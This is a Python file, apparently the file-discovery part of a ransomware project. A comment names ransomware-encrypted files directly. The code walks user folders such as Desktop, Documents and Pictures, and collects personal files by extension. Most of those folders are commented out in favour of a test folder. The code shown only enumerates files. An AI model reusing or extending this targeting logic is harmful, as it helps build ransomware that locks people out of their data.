import os

def is_important_file(file):
    extensions = { # Diccionario con categorías de archivos y sus extensiones correspondientes
        'images': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp', '.svg', '.ico', '.heif', '.heic'],
        'videos': ['.mp4', '.avi', '.mov', '.mkv', '.webm', '.flv', '.wmv', '.3gp', '.mpeg', '.mpg'],
        'music': ['.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.aiff', '.alac'],
        'documents': ['.pdf', '.doc', '.docx', '.odt', '.txt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.csv', '.md'],
        'databases': ['.db', '.sqlite', '.sql', '.mdb', '.accdb', '.json', '.xml'],
        'compressed_files': ['.zip', '.rar', '.7z', '.tar', '.gz', '.tar.gz', '.bz2', '.xz', '.cab'],
        'executable_files': ['.exe', '.msi', '.bat', '.sh', '.apk', '.jar', '.bin', '.deb', '.rpm'],
        'code_files': ['.py', '.java', '.c', '.cpp', '.cs', '.js', '.html', '.css', '.php', '.swift', '.go', '.rs', '.ts'],
        'configuration_files': ['.ini', '.cfg', '.json', '.yaml', '.yml', '.toml', '.env'],
        'design_files': ['.psd', '.ai', '.xd', '.fig', '.sketch'],
        'encrypted_extension': ['.encrypted'] # Extensión archivos cifrados por el ransomware (descifrado)
    }
    _, extension = os.path.splitext(file) # Extraer extensión del archivo
    is_important = any(extension.lower() in ext_list for ext_list in extensions.values()) # Verificar si la extensión coincide 
    return is_important # Devolver True o False para saber si es importante

def find_files(): # Función que obtiene los directorios de interés y lo pasa a walk_directory
    user_directory = os.environ.get('USERPROFILE', None)
    target_directories = [
        #os.path.join(user_directory, 'Desktop'),
        os.path.join(user_directory, 'Desktop', 'Test'),
        #os.path.join(user_directory, 'Pictures'),
        #os.path.join(user_directory, 'Documents'),
        #os.path.join(user_directory, 'Music'),
        #os.path.join(user_directory, 'Videos'),
        #os.path.join(user_directory, 'Downloads')
    ]
    files = walk_directory(target_directories)
    return files

def walk_directory(target_directories):  # Recursively scans multiple directories and returns important files
    important_files = []
    for directory in target_directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):  # Recursively walk through the directory
                for file in files:
                    if is_important_file(file):  # Check if the file is important
                        important_files.append(os.path.join(root, file))  # Add the full file path
    return important_files  # Return a list of absolute paths of important files 


